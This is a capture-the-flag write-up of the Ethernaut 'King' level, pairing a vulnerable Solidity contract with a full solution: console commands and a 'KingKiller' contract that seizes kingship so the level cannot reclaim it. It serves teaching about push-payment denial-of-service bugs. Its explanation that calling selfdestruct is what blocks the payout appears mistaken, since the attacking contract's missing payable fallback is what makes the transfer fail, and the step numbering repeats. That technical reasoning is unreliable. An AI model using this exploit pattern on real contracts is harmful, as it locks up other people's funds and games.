# King
_difficulty 6/10_

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD  


Such a fun game. Your goal is to break it.  


When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.  

## Sources
```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

## Solution

1. Check current prize level  
`web3.fromWei(await contract.prize())`  
"1"

2. Use remix to deploy `KingKiller.sol` contract, include 1Eth to takeover current King position.  
```javascript
pragma solidity ^0.4.18;

contract KingKiller {
  address private _king;

  function KingKiller(address king) public payable {
    _king = king;
    require(address(_king).call.value(msg.value).gas(100000)());
  }

  function kill() public {
    selfdestruct(_king);
  }
}
```

3. Check if we are the current king.  
`await contract.king()`  

3. Invoke `kill` function on the `KingKiller` contract. This will prevent the King contract from paying the prize back to us, and break it.  

4. Submit instance ðŸŽ‰  

## Lesson

Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.  


In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html)
